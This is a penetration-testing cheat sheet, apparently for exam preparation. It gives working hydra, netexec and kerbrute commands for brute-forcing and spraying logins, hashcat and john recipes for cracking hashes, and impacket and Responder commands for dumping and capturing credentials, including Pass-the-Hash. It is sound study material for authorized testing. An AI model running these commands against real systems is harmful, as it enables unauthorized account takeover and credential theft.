# Password Attacks & Hash Cracking

**Two jobs: (1) guess a live login, (2) crack a hash you already have.** Identify the hash type before you touch hashcat, pick the right mode, and spray responsibly. `{target}` = victim.

> Wordlists: `rockyou.txt` (`/usr/share/wordlists/rockyou.txt`) plus rules (`best64`, `OneRuleToRuleThemAll`). SecLists lives at `/usr/share/seclists/`.

---

## Part 1 — Online / Service Brute-Forcing (Hydra & netexec)

**Identify the mode, use a small focused list, respect lockout policy.**

```bash
# SSH
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4

# FTP
hydra -l admin -P passwords.txt ftp://{target}

# RDP
hydra -L users.txt -P passwords.txt rdp://{target}

# SMB / WinRM (prefer netexec — respects lockout, shows Pwn3d!)
nxc smb {target} -u users.txt -p passwords.txt --continue-on-success
nxc winrm {target} -u admin -p passwords.txt

# HTTP POST login form:  path:body-with-^USER^/^PASS^:failure-string
hydra -L users.txt -P passwords.txt {target} http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt {target} http-get /admin/
```

**Key hydra flags:** `-l`/`-L` single/list user, `-p`/`-P` single/list pass, `-t` threads (keep low, e.g. 4), `-f` stop on first hit, `-s` port, `-V` verbose.

**Find the failure string** by submitting a wrong login once in Burp — hydra needs the exact "invalid" text (or use `-S`/success matching).

---

## Part 2 — Password Spraying (the safe way)

One password, many users — avoids lockouts. Perfect for AD.
```bash
# Check the lockout policy FIRST
nxc smb {target} --pass-pol
# Spray one seasonal password across all users
nxc smb {target} -u users.txt -p 'Autumn2024!' --continue-on-success
kerbrute passwordspray -d corp.local --dc {target} users.txt 'Autumn2024!'
```
> Never loop many passwords against one account — you'll lock it and burn the box. Wait between rounds if the policy is tight.

---

## Part 3 — Identify the Hash

```bash
hashid '<hash>'
hash-identifier
# name-that-hash
nth -t '<hash>'
```

### Common hashcat modes (memorise the exam-relevant ones)
| Mode `-m` | Hash type |
|-----------|-----------|
| `0` | MD5 |
| `100` | SHA1 |
| `1000` | NTLM (Windows local/AD) |
| `1800` | sha512crypt `$6$` (Linux /etc/shadow) |
| `500` | md5crypt `$1$` |
| `3200` | bcrypt `$2*$` |
| `5600` | NetNTLMv2 (Responder capture) |
| `18200` | Kerberos AS-REP (`$krb5asrep$`) |
| `13100` | Kerberos TGS-REP / Kerberoast (`$krb5tgs$`) |
| `1000` | NTLM (Pass-the-Hash source) |
| `22000` | WPA-PBKDF2 (handshakes) |
| `13400` | KeePass |
| `10000` | Django PBKDF2-SHA256 |

---

## Part 4 — Cracking with Hashcat & John

```bash
# Straight dictionary
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
# Dictionary + rules (huge win rate)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1800 -a 0 shadow.hash rockyou.txt -r OneRuleToRuleThemAll.rule
# Mask / brute (e.g. 8-char upper+lower+digit)
hashcat -m 1000 -a 3 hashes.txt '?u?l?l?l?l?l?d?d'
# Show cracked
hashcat -m 1000 hashes.txt --show

# John equivalents
john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt hashes.txt
john --show hashes.txt
# John auto-detects; use unshadow for Linux:
unshadow /etc/passwd /etc/shadow > linux.hash
john linux.hash --wordlist=rockyou.txt
```

---

## Part 5 — Extracting Hashes from Files (`*2john`)

```bash
zip2john secret.zip > zip.hash          && hashcat -m 17200 zip.hash rockyou.txt
rar2john secret.rar > rar.hash
ssh2john id_rsa > ssh.hash              && john ssh.hash --wordlist=rockyou.txt   # (-m 22921 hashcat)
keepass2john db.kdbx > kp.hash          && hashcat -m 13400 kp.hash rockyou.txt
office2john doc.docx > office.hash
pdf2john file.pdf > pdf.hash
```

---

## Part 6 — Custom Wordlists

```bash
# Scrape the target site for candidate words
cewl -d 3 -m 5 http://{target} -w custom.txt
# Mangle a base list with rules (usernames, company, seasons + years)
hashcat --stdout base.txt -r best64.rule > mutated.txt
# Build combos with usernames + numbers/symbols
```

---

## Part 6 — Windows / AD Hash Sources (cross-ref AD chapter)

```bash
# From memory / SAM
impacket-secretsdump admin:'Pass'@{target}          # dumps LM:NT
# AS-REP roast (no creds) -> -m 18200
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip {target}
# Kerberoast (any cred) -> -m 13100
impacket-GetUserSPNs corp.local/user:pass -request -dc-ip {target}
# Responder captures -> -m 5600
sudo responder -I tun0 -dwv
```
> You don't need to crack NTLM to use it — **Pass-the-Hash** with the raw `NT` hash (`-hashes :NT`) works directly. Crack only when you need the plaintext (reuse elsewhere, RDP, etc.).

## Common Mistakes

- **Wrong `-m` mode.** `hashid`/`nth` first — cracking NTLM as MD5 (`-m 0`) finds nothing.
- **Spraying many passwords at one user** → account lockout → failed checkpoint.
- **Skipping rules.** `rockyou + best64/OneRule` cracks far more than the raw list.
- **Cracking a hash you could just Pass-the-Hash.** For NTLM/Kerberos, use the hash directly when the goal is access.
- **Huge userlists on online brute.** Keep online lists tight; save the big lists for offline hashcat.
